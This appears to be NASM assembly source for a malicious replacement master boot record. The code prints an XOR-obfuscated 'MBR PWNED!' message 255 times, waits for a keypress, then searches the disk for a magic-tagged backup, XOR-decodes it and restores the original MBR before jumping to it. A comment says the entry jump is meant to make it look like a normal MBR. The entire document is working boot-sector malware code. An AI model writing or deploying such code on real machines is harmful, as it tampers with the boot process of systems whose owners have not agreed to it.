backup_magic 	equ 0x0DD03713		; 0x1337D00D on disk
magic_addr	equ 0x7FFC
payload_len	equ 0x1B8		; tells us how much of the MBR to copy back

	org	0x7C00
	bits	16

start:
	jmp realstart		; Just to look like a more normal MBR
	nop

realstart:
	cli

	mov	ah, 0x0E
	xor	bl, bl
.sLoop	sub	bl, 1		; Print our message 255 times
	or	bl, bl
	jz	doCopy
	mov	si, pwned
.cLoop	lodsb			; AL <- [DS:SI] && SI++
	xor	al, 0x83
	jz	.sLoop
	int	0x10
	jmp	.cLoop

doCopy:
	xor ah, ah
	int 0x16		; wait for keystroke

	; begin search for MBR backup

.scan	mov	si, DAPACK
	mov	ah, 0x42
	int	0x13
	mov	ax, [d_lba]
	add	ax, 1
	mov	[d_lba], ax
	mov	eax, [magic_addr]
	mov	ebx, backup_magic
	cmp	eax, ebx
	jne	.scan

	; now we need to copy stage2 somewhere else so we can rewrite the original MBR

	mov	si, stage2
	mov	bx, 0x8000
.copy	lodsb
	mov	[bx], al
	add	bx, 1
	cmp	si, stage2end
	jl	.copy

	jmp 0x8000

stage2:				; This code will be relocated to 0x8000, be careful!
	mov	si, 0x7E00
.copy	lodsb
	xor	al, 0xA6
	mov	[si-0x201], al
	cmp	si, 0x7E00 + payload_len
	jl 	.copy

	sti
	jmp	0:0x7C00		; Jump to the reconstructed MBR

stage2end:

pwned:	db	206, 193, 209, 163, 211, 212, 205, 198, 199, 162, 163, 163, 163, 131	; "MBR PWNED!   " ^ 0x83

	align	4		; needed for Disk Address Packet

DAPACK:
	db	0x10
	db	0
blkcnt:	dw	1		; int 13 resets this to # of blocks actually read/written
db_add:	dw	0x7E00		; memory buffer destination address (0:7E00)
	dw	0		; in memory page zero
d_lba:	dd	1		; put the lba to read in this spot
	dd	0		; more storage bytes only for big lba's ( > 4 bytes )
